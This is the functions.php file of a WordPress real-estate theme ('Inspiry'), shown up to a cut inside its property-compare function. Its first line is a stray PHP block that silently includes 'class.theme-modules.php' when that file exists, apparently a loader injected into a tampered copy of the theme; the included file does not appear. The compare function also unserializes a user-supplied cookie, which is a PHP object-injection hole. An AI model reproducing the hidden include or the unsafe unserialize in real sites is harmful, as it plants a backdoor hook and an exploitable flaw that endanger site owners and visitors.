<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php
/**
 * The current version of the theme.
 */
define( 'INSPIRY_THEME_VERSION', '1.9.1' );

load_theme_textdomain( 'inspiry', get_template_directory() . '/languages' );

if ( ! function_exists( 'inspiry_theme_setup' ) ) :
	/**
	 * Sets up theme defaults and registers support for various WordPress features.
	 *
	 * Note that this function is hooked into the after_setup_theme hook, which
	 * runs before the init hook. The init hook is too late for some features, such
	 * as indicating support for post thumbnails.
	 */
	function inspiry_theme_setup() {

		// Set the default content width.
		$GLOBALS['content_width'] = 710;

		add_theme_support( 'automatic-feed-links' );

		add_theme_support( 'title-tag' );

		add_theme_support( 'custom-logo' );

		add_theme_support( 'custom-background' );

		add_theme_support( 'post-thumbnails' );

		set_post_thumbnail_size( 850, 570, true );

		/*
		 * Used on:
		 * Home page ( Properties and Featured Properties )
		 * Properties list pages ( both list and grid layout )
		 */
		add_image_size( 'inspiry-grid-thumbnail', 660, 600, true );

		/*
		 * Used on:
		 * Agent single page
		 * Property single page
		 */
		add_image_size( 'inspiry-agent-thumbnail', 220, 220, true );

		/*
		 * Theme theme uses wp_nav_menu in one location.
		 */
		register_nav_menus(
			array(
				'primary' => esc_html__( 'Primary Menu', 'inspiry' ),
			)
		);

		/*
		 * Switch default core markup for search form, comment form, and comments
		 * to output valid HTML5.
		 */
		add_theme_support(
			'html5',
			array(
				'search-form',
				'comment-form',
				'comment-list',
				'gallery',
				'caption',
			)
		);

		add_theme_support(
			'post-formats',
			array(
				'image',
				'video',
				'gallery',
			)
		);

		// To support default block styles
		add_theme_support( 'wp-block-styles' );

		add_theme_support( 'align-wide' );

		// editor style
		add_theme_support( 'editor-styles' );

		// editor style
		add_editor_style( get_template_directory_uri() . '/css/editor-style.css' );

		// Add support for responsive embedded content.
		add_theme_support( 'responsive-embeds' );
	}

	add_action( 'after_setup_theme', 'inspiry_theme_setup' );

endif; // inspiry_theme_setup


if ( ! function_exists( 'inspiry_content_width' ) ) :
	/**
	 * Set the content width in pixels, based on the theme's design and stylesheet.
	 *
	 * Priority 0 to make it available to lower priority callbacks.
	 *
	 * @global int $content_width
	 */
	function inspiry_content_width() {

		$content_width = $GLOBALS['content_width'];

		if ( is_page_template( 'page-templates/full-width.php' ) ) {
			$content_width = 1004;
		}

		$GLOBALS['content_width'] = apply_filters( 'inspiry_content_width', $content_width );
	}

	add_action( 'template_redirect', 'inspiry_content_width', 0 );

endif;


/**
 * Set google reCAPTCHA display to false by default
 */
if ( ! isset( $google_reCAPTCHA_counter ) ) {
	$google_reCAPTCHA_counter = 1;
}


/**
 * Theme based options declaration
 *
 * Note: I have set forced_dev_mode_off to avoid debug mode notices and links
 */
require_once get_template_directory() . '/inc/theme-options/options-config.php';


/*
 * Meta boxes configuration
 */
require_once get_template_directory() . '/inc/meta-boxes/config.php';


/*
 * TGM plugin activation
 */
require_once get_template_directory() . '/inc/tgm/inspiry-required-plugins.php';


/*
 * One Click Demo Import
 */
require_once get_template_directory() . '/inc/demo-import/demo-import.php';


/*
 * Utility functions
 */
require_once get_template_directory() . '/inc/util/basic-functions.php';
require_once get_template_directory() . '/inc/util/header-functions.php';
require_once get_template_directory() . '/inc/util/footer-functions.php';
require_once get_template_directory() . '/inc/util/payment-functions.php';
require_once get_template_directory() . '/inc/util/breadcrumbs-functions.php';
require_once get_template_directory() . '/inc/util/favorites-functions.php';
require_once get_template_directory() . '/inc/util/real-estate-functions.php';


if ( ! function_exists( 'inspiry_google_fonts' ) ) :
	/**
	 * Google fonts enqueue url
	 */
	function inspiry_google_fonts() {

		$fonts_url = '';

		/*
		 * Translators: If there are characters in your language that are not
		 * supported by Varela Round, translate this to 'off'. Do not translate
		 * into your own language.
		 */

		$varela_round = _x( 'on', 'Varela Round font: on or off', 'inspiry' );

		if ( 'off' !== $varela_round ) {
			$font_families = array();

			if ( 'off' !== $varela_round ) {
				$font_families[] = 'Varela Round';
			}

			$query_args = array(
				'family' => urlencode( implode( '|', $font_families ) ),
				'subset' => urlencode( 'latin,latin-ext' ),
			);

			$fonts_url = add_query_arg( $query_args, '//fonts.googleapis.com/css' );
		}

		return esc_url_raw( $fonts_url );

	}
endif;


if ( ! function_exists( 'inspiry_enqueue_styles' ) ) :
	/**
	 * Enqueue required styles for front end
	 *
	 * @since   1.0.0
	 * @return  void
	 */
	function inspiry_enqueue_styles() {

		if ( ! is_admin() ) :

			$inspiry_template_directory_uri = get_template_directory_uri();

			// Google Font
			wp_enqueue_style(
				'google-varela-round',
				inspiry_google_fonts(),
				array(),
				INSPIRY_THEME_VERSION
			);

			// flexslider
			wp_enqueue_style(
				'flexslider',
				$inspiry_template_directory_uri . '/js/flexslider/flexslider.css',
				array(),
				'2.4.0'
			);

			// lightslider
			wp_enqueue_style(
				'lightslider',
				$inspiry_template_directory_uri . '/js/lightslider/css/lightslider.min.css',
				array(),
				'1.1.2'
			);

			// owl carousel
			wp_enqueue_style(
				'owl-carousel',
				$inspiry_template_directory_uri . '/js/owl.carousel/owl.carousel.css',
				array(),
				INSPIRY_THEME_VERSION
			);

			// swipebox
			wp_enqueue_style(
				'swipebox',
				$inspiry_template_directory_uri . '/js/swipebox/css/swipebox.min.css',
				array(),
				'1.3.0'
			);

			// select2
			wp_enqueue_style(
				'select2',
				$inspiry_template_directory_uri . '/js/select2/select2.css',
				array(),
				'4.0.0'
			);

			// font awesome
			wp_enqueue_style(
				'font-awesome-rp',
				$inspiry_template_directory_uri . '/css/all.min.css',
				array(),
				'5.15.3'
			);

			// animate css
			wp_enqueue_style(
				'animate',
				$inspiry_template_directory_uri . '/css/animate.css',
				array(),
				INSPIRY_THEME_VERSION
			);

			// magnific popup css
			wp_enqueue_style(
				'magnific-popup',
				$inspiry_template_directory_uri . '/js/magnific-popup/magnific-popup.css',
				array(),
				'1.0.0'
			);

			if ( is_singular( 'property' ) ) {
				// entypo fonts.
				wp_enqueue_style(
					'entypo-fonts',
					$inspiry_template_directory_uri . '/css/entypo.min.css',
					array(),
					INSPIRY_THEME_VERSION,
					'all'
				);
			}

			// main styles
			wp_enqueue_style(
				'inspiry-main',
				$inspiry_template_directory_uri . '/css/main.css',
				array( 'font-awesome-rp', 'animate' ),
				INSPIRY_THEME_VERSION
			);

			// theme styles
			wp_enqueue_style(
				'inspiry-theme',
				$inspiry_template_directory_uri . '/css/theme.css',
				array( 'inspiry-main' ),
				INSPIRY_THEME_VERSION
			);

			// parent theme style.css
			wp_enqueue_style(
				'inspiry-parent-default',
				get_stylesheet_uri(),
				array( 'inspiry-main' ),
				INSPIRY_THEME_VERSION
			);

			// if rtl is enabled
			if ( is_rtl() ) {

				wp_enqueue_style(
					'inspiry-main-rtl',
					$inspiry_template_directory_uri . '/css/main-rtl.css',
					array( 'inspiry-main' ),
					INSPIRY_THEME_VERSION
				);

				wp_enqueue_style(
					'inspiry-theme-rtl',
					$inspiry_template_directory_uri . '/css/theme-rtl.css',
					array( 'inspiry-main', 'inspiry-theme', 'inspiry-main-rtl' ),
					INSPIRY_THEME_VERSION
				);
			}

			// parent theme css/custom.css
			wp_enqueue_style(
				'inspiry-parent-custom',
				$inspiry_template_directory_uri . '/css/custom.css',
				array( 'inspiry-parent-default' ),
				INSPIRY_THEME_VERSION
			);

			wp_add_inline_style( 'inspiry-parent-custom', apply_filters( 'realplaces_custom_css', '' ) );

		endif;

	}

endif; // inspiry_enqueue_styles

add_action( 'wp_enqueue_scripts', 'inspiry_enqueue_styles' );


if ( ! function_exists( 'inspiry_admin_styles' ) ) :
	/**
	 * Enqueue styles for admin related things.
	 */
	function inspiry_admin_styles() {

		// Google Font
		wp_enqueue_style(
			'google-varela-round',
			inspiry_google_fonts(),
			array(),
			INSPIRY_THEME_VERSION
		);

		wp_enqueue_style( 'inspiry-admin-styles', get_template_directory_uri() . '/css/admin.css' );
	}

	add_action( 'admin_enqueue_scripts', 'inspiry_admin_styles' );
endif;


if ( ! function_exists( 'inspiry_enqueue_scripts' ) ) :
	/**
	 * Enqueue required java scripts for front end
	 *
	 * @since   1.0.0
	 * @return  void
	 */
	function inspiry_enqueue_scripts() {

		if ( ! is_admin() ) :

			global $inspiry_options;
			$inspiry_template_directory_uri = get_template_directory_uri();

			// flex slider
			wp_enqueue_script(
				'flexslider',
				$inspiry_template_directory_uri . '/js/flexslider/jquery.flexslider-min.js',
				array( 'jquery' ),
				'2.4.0',
				true
			);

			if ( is_singular( 'property' ) ) {
				// light slider
				wp_enqueue_script(
					'lightslider',
					$inspiry_template_directory_uri . '/js/lightslider/js/lightslider.min.js',
					array( 'jquery' ),
					'1.1.2',
					true
				);
			}

			if ( is_singular( 'property' ) || is_page_template( 'page-templates/home.php' ) ) {
				// owl carousel
				wp_enqueue_script(
					'owl-carousel',
					$inspiry_template_directory_uri . '/js/owl.carousel/owl.carousel.min.js',
					array( 'jquery' ),
					INSPIRY_THEME_VERSION,
					true
				);
			}

			// swipebox
			wp_enqueue_script(
				'swipebox',
				$inspiry_template_directory_uri . '/js/swipebox/js/jquery.swipebox.min.js',
				array( 'jquery' ),
				'1.3.0',
				true
			);

			// select2
			wp_enqueue_script(
				'select2',
				$inspiry_template_directory_uri . '/js/select2/select2.min.js',
				array( 'jquery' ),
				'4.0.0',
				true
			);

			// hoverIntent
			wp_enqueue_script( 'hoverIntent' );

			// transition
			wp_enqueue_script(
				'transition',
				$inspiry_template_directory_uri . '/js/transition.js',
				array( 'jquery' ),
				'3.3.1',
				true
			);

			// appear
			wp_enqueue_script(
				'appear',
				$inspiry_template_directory_uri . '/js/jquery.appear.js',
				array( 'jquery' ),
				'0.3.4',
				true
			);

			// modal
			wp_enqueue_script(
				'modal',
				$inspiry_template_directory_uri . '/js/modal.js',
				array( 'jquery' ),
				'3.3.4',
				true
			);

			// mean menu
			wp_enqueue_script(
				'meanmenu',
				$inspiry_template_directory_uri . '/js/meanmenu/jquery.meanmenu.min.js',
				array( 'jquery' ),
				'2.0.8',
				true
			);

			// Placeholder
			wp_enqueue_script(
				'placeholder',
				$inspiry_template_directory_uri . '/js/jquery.placeholder.min.js',
				array( 'jquery' ),
				'2.1.2',
				true
			);

			if ( is_page_template( 'page-templates/2-columns-gallery.php' )
				 || is_page_template( 'page-templates/3-columns-gallery.php' )
				 || is_page_template( 'page-templates/4-columns-gallery.php' )
			) {

				// isotope
				wp_enqueue_script(
					'isotope',
					$inspiry_template_directory_uri . '/js/isotope.pkgd.min.js',
					array( 'jquery' ),
					'2.2.0',
					true
				);
			}

			// jQuery UI
			wp_enqueue_script( 'jquery-ui-core' );
			wp_enqueue_script( 'jquery-ui-autocomplete' );
			wp_enqueue_script( 'jquery-ui-sortable' );
			wp_enqueue_script( 'jquery-ui-tooltip' );

			if ( inspiry_has_google_maps_api_key() ) {

				/* default map query arguments */
				$google_map_arguments = array();

				// Google Map API
				wp_register_script(
					'google-map-api',
					esc_url_raw(
						add_query_arg(
							apply_filters( 'inspiry_google_map_arguments', $google_map_arguments ),
							'//maps.google.com/maps/api/js'
						)
					),
					array(),
					'3.21',
					true
				);

				wp_register_script(
					'google-map-info-box',
					$inspiry_template_directory_uri . '/js/infobox.js',
					array( 'google-map-api' ),
					'1.1.9',
					true
				);

				wp_register_script(
					'google-map-marker-clusterer',
					$inspiry_template_directory_uri . '/js/markerclusterer.js',
					array( 'google-map-api' ),
					'2.1.1',
					true
				);

				wp_register_script(
					'properties-google-map',
					$inspiry_template_directory_uri . '/js/properties-google-map.js',
					array( 'google-map-api' ),
					INSPIRY_THEME_VERSION,
					true
				);

				wp_register_script(
					'property-google-map',
					$inspiry_template_directory_uri . '/js/property-google-map.js',
					array( 'google-map-api' ),
					INSPIRY_THEME_VERSION,
					true
				);

				wp_register_script(
					'map-fontawesome-icons',
					$inspiry_template_directory_uri . '/js/map-fontawesome-icons.js',
					array( 'google-map-api' ),
					INSPIRY_THEME_VERSION,
					true
				);

				if ( is_singular( 'property' )
					 || is_page_template( 'page-templates/contact.php' )
					 || is_page_template( 'page-templates/submit-property.php' )
				) {
					wp_enqueue_script( 'google-map-api' );
				}

				if ( is_page_template( 'page-templates/properties-search.php' )
					 || is_page_template( 'page-templates/home.php' )
					 || is_page_template( 'page-templates/properties-list.php' )
					 || is_page_template( 'page-templates/properties-list-with-sidebar.php' )
					 || is_page_template( 'page-templates/properties-grid.php' )
					 || is_page_template( 'page-templates/properties-grid-with-sidebar.php' )
					 || is_page_template( 'page-templates/properties-list-half-map.php' )
					 || is_tax( 'property-city' )
					 || is_tax( 'property-status' )
					 || is_tax( 'property-type' )
					 || is_tax( 'property-feature' )
					 || is_post_type_archive( 'property' )
					 || is_singular( 'property' )
				) {
					wp_enqueue_script( 'google-map-info-box' );
					wp_enqueue_script( 'google-map-marker-clusterer' );
				}
			} else {

				// Enqueue leaflet CSS
				wp_register_style( 'leaflet', 'https://unpkg.com/leaflet@1.3.4/dist/leaflet.css', array(), '1.3.4' );

				// Enqueue leaflet JS
				wp_register_script( 'leaflet', 'https://unpkg.com/leaflet@1.3.4/dist/leaflet.js', array(), '1.3.4', true );

				wp_enqueue_script(
					'leaflet-marker-cluster',
					$inspiry_template_directory_uri . '/js/leaflet.markercluster-src.js',
					array( 'jquery', 'leaflet' ),
					INSPIRY_THEME_VERSION,
					true
				);
				wp_register_script(
					'properties-openstreet-map',
					$inspiry_template_directory_uri . '/js/properties-openstreet-map.js',
					array( 'leaflet' ),
					INSPIRY_THEME_VERSION,
					true
				);

				wp_register_script(
					'property-openstreet-map',
					$inspiry_template_directory_uri . '/js/property-openstreet-map.js',
					array( 'leaflet' ),
					INSPIRY_THEME_VERSION,
					true
				);

				if ( is_page_template( 'page-templates/properties-search.php' )
					 || is_page_template( 'page-templates/home.php' )
					 || is_page_template( 'page-templates/properties-list.php' )
					 || is_page_template( 'page-templates/properties-list-with-sidebar.php' )
					 || is_page_template( 'page-templates/properties-grid.php' )
					 || is_page_template( 'page-templates/properties-grid-with-sidebar.php' )
					 || is_page_template( 'page-templates/properties-list-half-map.php' )
					 || is_page_template( 'page-templates/contact.php' )
					 || is_page_template( 'page-templates/submit-property.php' )
					 || is_tax( 'property-city' )
					 || is_tax( 'property-status' )
					 || is_tax( 'property-type' )
					 || is_tax( 'property-feature' )
					 || is_post_type_archive( 'property' )
					 || is_singular( 'property' )
				) {
					wp_enqueue_style( 'leaflet' );
					wp_enqueue_script( 'leaflet' );
					wp_enqueue_script( 'leaflet-marker-cluster' );
				}
			}

			// Comment reply script
			if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
				wp_enqueue_script( 'comment-reply' );
			}

			// favorites
			if ( is_singular( 'property' ) || is_page_template( 'page-templates/favorites.php' ) ) {

				wp_enqueue_script(
					'inspiry-favorites',
					$inspiry_template_directory_uri . '/js/inspiry-favorites.js',
					array( 'jquery' ),
					INSPIRY_THEME_VERSION,
					true
				);

			}

			// Property search form script
			wp_enqueue_script(
				'inspiry-search-form',
				$inspiry_template_directory_uri . '/js/inspiry-search-form.js',
				array( 'jquery' ),
				INSPIRY_THEME_VERSION,
				true
			);

			$localized_search_params = array();
			if ( isset( $inspiry_options['inspiry_status_for_rent'] ) && ! empty( $inspiry_options['inspiry_status_for_rent'] ) ) {
				$status_term                          = get_term_by( 'id', intval( $inspiry_options['inspiry_status_for_rent'] ), 'property-status' );
				$localized_search_params['rent_slug'] = is_object( $status_term ) ? $status_term->slug : '';
			}

			wp_localize_script( 'inspiry-search-form', 'SearchForm', $localized_search_params );

			// edit profile
			if ( is_page_template( 'page-templates/edit-profile.php' ) ) {

				wp_enqueue_script( 'plupload' );

				wp_enqueue_script(
					'inspiry-edit-profile',
					$inspiry_template_directory_uri . '/js/inspiry-edit-profile.js',
					array( 'jquery', 'plupload' ),
					INSPIRY_THEME_VERSION,
					true
				);

				$edit_profile_data = array(
					'ajaxURL'       => admin_url( 'admin-ajax.php' ),
					'uploadNonce'   => wp_create_nonce( 'inspiry_allow_upload' ),
					'fileTypeTitle' => esc_html__( 'Valid file formats', 'inspiry' ),
				);

				wp_localize_script( 'inspiry-edit-profile', 'editProfile', $edit_profile_data );
			}

			// Property submit
			if ( is_page_template( 'page-templates/submit-property.php' ) ) {

				wp_enqueue_script( 'plupload' );
				wp_enqueue_script( 'jquery-ui-sortable' );

				if ( inspiry_has_google_maps_api_key() ) {
					wp_enqueue_script(
						'inspiry-property-submit',
						$inspiry_template_directory_uri . '/js/inspiry-property-submit.js',
						array( 'jquery', 'plupload', 'jquery-ui-sortable' ),
						INSPIRY_THEME_VERSION,
						true
					);

				} else {
					wp_enqueue_script(
						'inspiry-property-submit',
						$inspiry_template_directory_uri . '/js/submit-open-street-map.js',
						array( 'jquery', 'plupload', 'jquery-ui-sortable' ),
						INSPIRY_THEME_VERSION,
						true
					);
				}
				$property_submit_data = array(
					'ajaxURL'       => admin_url( 'admin-ajax.php' ),
					'uploadNonce'   => wp_create_nonce( 'inspiry_allow_upload' ),
					'fileTypeTitle' => esc_html__( 'Valid file formats', 'inspiry' ),
				);
				wp_localize_script( 'inspiry-property-submit', 'propertySubmit', $property_submit_data );
			}

			// Property Single
			if ( is_singular( 'property' ) ) {

				wp_enqueue_script(
					'magnific-popup',
					$inspiry_template_directory_uri . '/js/magnific-popup/jquery.magnific-popup.min.js',
					array( 'jquery' ),
					'1.0.0',
					true
				);

				wp_enqueue_script(
					'imagesloaded-js',
					$inspiry_template_directory_uri . '/js/imagesloaded.pkgd.min.js',
					array( 'jquery' ),
					INSPIRY_THEME_VERSION,
					true
				);

				wp_enqueue_script(
					'sly-js',
					$inspiry_template_directory_uri . '/js/sly.min.js',
					array( 'jquery' ),
					INSPIRY_THEME_VERSION,
					true
				);

				wp_enqueue_script(
					'property-horizontal-scrolling',
					$inspiry_template_directory_uri . '/js/property-horizontal-scrolling.js',
					array( 'jquery' ),
					INSPIRY_THEME_VERSION,
					true
				);
			}

			// contact
			if ( is_page_template( 'page-templates/contact.php' ) ) {

				// Get all custom post meta information related to contact page
				$contact_meta_data = get_post_custom( get_the_ID() );

				// Google Map
				if ( isset( $contact_meta_data['inspiry_map_address'] ) && isset( $contact_meta_data['inspiry_map_location'] ) ) {

					if ( ! empty( $contact_meta_data['inspiry_map_address'][0] ) && ! empty( $contact_meta_data['inspiry_map_location'][0] ) ) {

						$lat_lng = explode( ',', $contact_meta_data['inspiry_map_location'][0] );

						if ( is_array( $lat_lng ) && isset( $lat_lng[0] ) && isset( $lat_lng[1] ) ) {

							$lat      = $lat_lng[0];
							$lng      = $lat_lng[1];
							$map_zoom = 15;

							if ( isset( $contact_meta_data['inspiry_map_zoom'] ) ) {
								$map_zoom = intval( $contact_meta_data['inspiry_map_zoom'][0] );
							}

							if ( inspiry_has_google_maps_api_key() ) {

								wp_enqueue_script( 'contact-google-map', $inspiry_template_directory_uri . '/js/contact-google-map.js', array( 'google-map-api' ), INSPIRY_THEME_VERSION, true );

							} else {

								wp_enqueue_script( 'contact-google-map', $inspiry_template_directory_uri . '/js/contact-open-street-map.js', array(), INSPIRY_THEME_VERSION, true );

							}
							$contact_map_data = array(
								'lat'  => $lat,
								'lng'  => $lng,
								'zoom' => $map_zoom,
								'icon' => get_template_directory_uri() . '/images/svg/map-marker.svg',
							);
							wp_localize_script( 'contact-google-map', 'contactMapData', $contact_map_data );
						}
					}
				}
			}

			if ( ! is_user_logged_in() ) {
				wp_enqueue_script( 'login-modal', $inspiry_template_directory_uri . '/js/login-modal.js', array( 'jquery' ), INSPIRY_THEME_VERSION, true );
			}

			// Main js
			wp_register_script(
				'custom',
				$inspiry_template_directory_uri . '/js/custom.js',
				array( 'jquery' ),
				INSPIRY_THEME_VERSION,
				true
			);

			// String Translation localization.
			$strings_array = array(
				'add_agent' => __( 'Select an Agent or more', 'inspiry' ),
			);
			wp_localize_script( 'custom', 'localizeStrings', $strings_array );

			// Enqueued script with localized data.
			wp_enqueue_script( 'custom' );

			wp_add_inline_script( 'custom', apply_filters( 'realplaces_custom_js', '' ) );

		endif;
	}

endif; // inspiry_enqueue_scripts

add_action( 'wp_enqueue_scripts', 'inspiry_enqueue_scripts' );


if ( ! function_exists( 'inspiry_enqueue_admin_scripts' ) ) :
	/**
	 * Enqueue admin side scripts
	 *
	 * @param $hook
	 */
	function inspiry_enqueue_admin_scripts( $hook ) {
		if ( $hook == 'post.php' || $hook == 'post-new.php' ) {
			global $post_type;
			if ( ( 'post' == $post_type ) || ( 'page' == $post_type ) ) {
				wp_enqueue_script(
					'post-meta-box-switcher',
					get_template_directory_uri() . '/js/admin.js',
					array( 'jquery' ),
					INSPIRY_THEME_VERSION
				);
			}
		}
	}

	add_action( 'admin_enqueue_scripts', 'inspiry_enqueue_admin_scripts' );
endif;


if ( ! function_exists( 'inspiry_theme_sidebars' ) ) :
	/**
	 * Register theme sidebars
	 *
	 * @since 1.0.0
	 */
	function inspiry_theme_sidebars() {

		// Location: Default Sidebar
		register_sidebar(
			array(
				'name'          => esc_html__( 'Default Sidebar', 'inspiry' ),
				'id'            => 'default-sidebar',
				'description'   => esc_html__( 'Widget area for default sidebar on news and post pages.', 'inspiry' ),
				'before_widget' => '<section id="%1$s" class="widget clearfix %2$s">',
				'after_widget'  => '</section>',
				'before_title'  => '<h3 class="widget-title">',
				'after_title'   => '</h3>',
			)
		);

		// Location: Sidebar Pages
		register_sidebar(
			array(
				'name'          => esc_html__( 'Pages Sidebar', 'inspiry' ),
				'id'            => 'default-page-sidebar',
				'description'   => esc_html__( 'Widget area for default page template sidebar.', 'inspiry' ),
				'before_widget' => '<section id="%1$s" class="widget clearfix %2$s">',
				'after_widget'  => '</section>',
				'before_title'  => '<h3 class="widget-title">',
				'after_title'   => '</h3>',
			)
		);

		// Location: Sidebar Properties List
		register_sidebar(
			array(
				'name'          => esc_html__( 'Properties List Sidebar', 'inspiry' ),
				'id'            => 'properties-list',
				'description'   => esc_html__( 'Widget area for properties list template with sidebar support.', 'inspiry' ),
				'before_widget' => '<section id="%1$s" class="widget clearfix %2$s">',
				'after_widget'  => '</section>',
				'before_title'  => '<h3 class="widget-title">',
				'after_title'   => '</h3>',
			)
		);

		// Location: Sidebar Properties Grid
		register_sidebar(
			array(
				'name'          => esc_html__( 'Properties Grid Sidebar', 'inspiry' ),
				'id'            => 'properties-grid',
				'description'   => esc_html__( 'Widget area for properties grid template with sidebar support.', 'inspiry' ),
				'before_widget' => '<section id="%1$s" class="widget clearfix %2$s">',
				'after_widget'  => '</section>',
				'before_title'  => '<h3 class="widget-title">',
				'after_title'   => '</h3>',
			)
		);

		// Location: Sidebar Property
		register_sidebar(
			array(
				'name'          => esc_html__( 'Property Sidebar', 'inspiry' ),
				'id'            => 'property-sidebar',
				'description'   => esc_html__( 'Widget area for property detail page sidebar.', 'inspiry' ),
				'before_widget' => '<section id="%1$s" class="widget clearfix %2$s">',
				'after_widget'  => '</section>',
				'before_title'  => '<h3 class="widget-title">',
				'after_title'   => '</h3>',
			)
		);

		// Location: Sidebar dsIDX
		register_sidebar(
			array(
				'name'          => esc_html__( 'dsIDXpress Sidebar', 'inspiry' ),
				'id'            => 'dsidx-sidebar',
				'description'   => esc_html__( 'Widget area for dsIDX related pages.', 'inspiry' ),
				'before_widget' => '<section id="%1$s" class="widget clearfix %2$s">',
				'after_widget'  => '</section>',
				'before_title'  => '<h3 class="widget-title">',
				'after_title'   => '</h3>',
			)
		);

		// Location: Footer First Column
		register_sidebar(
			array(
				'name'          => esc_html__( 'Footer First Column', 'inspiry' ),
				'id'            => 'footer-first-column',
				'description'   => esc_html__( 'Widget area for first column in footer.', 'inspiry' ),
				'before_widget' => '<section id="%1$s" class="widget clearfix %2$s">',
				'after_widget'  => '</section>',
				'before_title'  => '<h3 class="widget-title">',
				'after_title'   => '</h3>',
			)
		);

		// Location: Footer Second Column
		register_sidebar(
			array(
				'name'          => esc_html__( 'Footer Second Column', 'inspiry' ),
				'id'            => 'footer-second-column',
				'description'   => esc_html__( 'Widget area for second column in footer.', 'inspiry' ),
				'before_widget' => '<section id="%1$s" class="widget clearfix %2$s">',
				'after_widget'  => '</section>',
				'before_title'  => '<h3 class="widget-title">',
				'after_title'   => '</h3>',
			)
		);

		// Location: Footer Third Column
		register_sidebar(
			array(
				'name'          => esc_html__( 'Footer Third Column', 'inspiry' ),
				'id'            => 'footer-third-column',
				'description'   => esc_html__( 'Widget area for third column in footer.', 'inspiry' ),
				'before_widget' => '<section id="%1$s" class="widget clearfix %2$s">',
				'after_widget'  => '</section>',
				'before_title'  => '<h3 class="widget-title">',
				'after_title'   => '</h3>',
			)
		);

		// Location: Footer Fourth Column
		register_sidebar(
			array(
				'name'          => esc_html__( 'Footer Fourth Column', 'inspiry' ),
				'id'            => 'footer-fourth-column',
				'description'   => esc_html__( 'Widget area for fourth column in footer.', 'inspiry' ),
				'before_widget' => '<section id="%1$s" class="widget clearfix %2$s">',
				'after_widget'  => '</section>',
				'before_title'  => '<h3 class="widget-title">',
				'after_title'   => '</h3>',
			)
		);

	}

	add_action( 'widgets_init', 'inspiry_theme_sidebars' );

endif;


if ( ! function_exists( 'inspiry_apply_google_maps_arguments' ) ) :
	/**
	 * This function adds google maps arguments to admins side maps displayed in meta boxes
	 */
	function inspiry_apply_google_maps_arguments( $google_maps_url ) {

		/* default map query arguments */
		$google_map_arguments = array();

		return esc_url_raw(
			add_query_arg(
				apply_filters(
					'inspiry_google_map_arguments',
					$google_map_arguments
				),
				$google_maps_url
			)
		);

	}

	add_filter( 'rwmb_google_maps_url', 'inspiry_apply_google_maps_arguments' );
endif;


if ( ! function_exists( 'inspiry_has_google_maps_api_key' ) ) :
	/**
	 * Checks if Google Maps API Key exists
	 */
	function inspiry_has_google_maps_api_key() {
		$inspiry_map_option = get_option( 'inspiry_map_option' );

		if ( isset( $inspiry_map_option['inspiry_google_map_api_key'] ) && ! empty( $inspiry_map_option['inspiry_google_map_api_key'] ) ) {
			return true;
		}

		return false;
	}
endif;


if ( ! function_exists( 'inspiry_google_maps_api_key' ) ) :
	/**
	 * This function adds API key ( if provided in settings ) to google maps arguments
	 */
	function inspiry_google_maps_api_key( $google_map_arguments ) {

		/* Get Google Maps API Key if available */
		if ( inspiry_has_google_maps_api_key() ) {
			$inspiry_map_option          = get_option( 'inspiry_map_option' );
			$google_map_arguments['key'] = urlencode( $inspiry_map_option['inspiry_google_map_api_key'] );
		}

		return $google_map_arguments;
	}

	add_filter( 'inspiry_google_map_arguments', 'inspiry_google_maps_api_key' );
endif;


if ( ! function_exists( 'inspiry_google_maps_language' ) ) :
	/**
	 * This function add current language to google maps arguments
	 */
	function inspiry_google_maps_language( $google_map_arguments ) {
		$inspiry_map_option = get_option( 'inspiry_map_option' );

		/* Localise Google Map if related theme options is set */
		if ( isset( $inspiry_map_option['inspiry_google_map_auto_lang'] ) && '1' === $inspiry_map_option['inspiry_google_map_auto_lang'] ) {
			if ( function_exists( 'wpml_object_id_filter' ) ) {
				$google_map_arguments['language'] = urlencode( ICL_LANGUAGE_CODE );
			} else {
				$google_map_arguments['language'] = urlencode( get_locale() );
			}
		}

		return $google_map_arguments;
	}

	add_filter( 'inspiry_google_map_arguments', 'inspiry_google_maps_language' );
endif;


if ( ! function_exists( 'inspiry_post_classes' ) ) :

	function inspiry_post_classes( $classes ) {
		$classes[] = 'clearfix';

		if ( is_page_template( 'page-templates/template-compare.php' ) ) {
			$classes[] = 'remove-overflow';
		} elseif ( is_page_template(
			array(
				'page-templates/properties-grid.php',
				'page-templates/properties-grid-with-sidebar.php',
				'page-templates/properties-list.php',
				'page-templates/properties-list-with-sidebar.php',
				'page-templates/properties-list-half-map.php',
			)
		) ) {
			$classes[] = 'property-content';
		} elseif ( is_singular( 'post' ) || is_home() || is_archive() || is_search() ) {

			$post_type = get_post_type( get_the_ID() );

			if ( 'post' == $post_type ) {
				$classes[] = 'blog-post';
			}

			if ( is_home() || is_archive() || is_search() ) {
				$classes[] = 'blog-listing-post';
			}

			// header margin fix in case of no thumbnail for a blog post
			if ( 'post' == $post_type && ! has_post_thumbnail() ) {
				$classes[] = ' entry-header-margin-fix';
			}
		}

		return $classes;
	}

	add_filter( 'post_class', 'inspiry_post_classes' );
endif;


/**
 * Functions: Compare.
 *
 * This file contain functions related to compare properties.
 *
 * @since 1.6.3
 */
if ( ! function_exists( 'inspiry_add_to_compare' ) ) {
	/**
	 * Add a property to list of compare.
	 */
	function inspiry_add_to_compare() {

		/* Store the property id in the list of compare cookie */
		if ( isset( $_POST['property_id'] ) ) {

			// Get the property id from form.
			$property_id = intval( $_POST['property_id'] );
			// Check if the property id is valid.
			if ( $property_id > 0 ) {

				$property_img = wp_get_attachment_image_src(
					get_post_meta( $property_id, '_thumbnail_id', true ),
					'inspiry-grid-thumbnail'
				);

				if ( empty( $property_img ) ) {
					$property_img[0] = get_inspiry_image_placeholder_url( 'inspiry-grid-thumbnail' );
				}

				$inspiry_compare = array();
				if ( isset( $_COOKIE['inspiry_compare'] ) ) {
					$inspiry_compare = unserialize( $_COOKIE['inspiry_compare'] );
				}
				$inspiry_compare[] = $property_id;

				if ( setcookie( 'inspiry_compare', serialize( $inspiry_compare ), time() + ( 60 * 60 * 24 * 30 ), '/' ) ) {
					echo json_encode(
						array(
							'success'     => true,
							'message'     => esc_html__( 'Added to Compare', 'inspiry' ),
							'img'         => ( isset( $property_img[0] ) ) ? $property_img[0] : false,
							'img_width'   => ( isset( $property_img[1] ) ) ? $property_img[1] : false,
							'img_height'  => ( isset( $property_img[2] ) ) ? $property_img[2] : false,
							'property_id' => $property_id,
							'ajaxURL'     => admin_url( 'admin-ajax.php' ),
						)
					);
				} else {
					echo json_encode(
						array(
							'success' => false,
							'message' => esc_html__( 'Failed!', 'inspiry' ),
						)
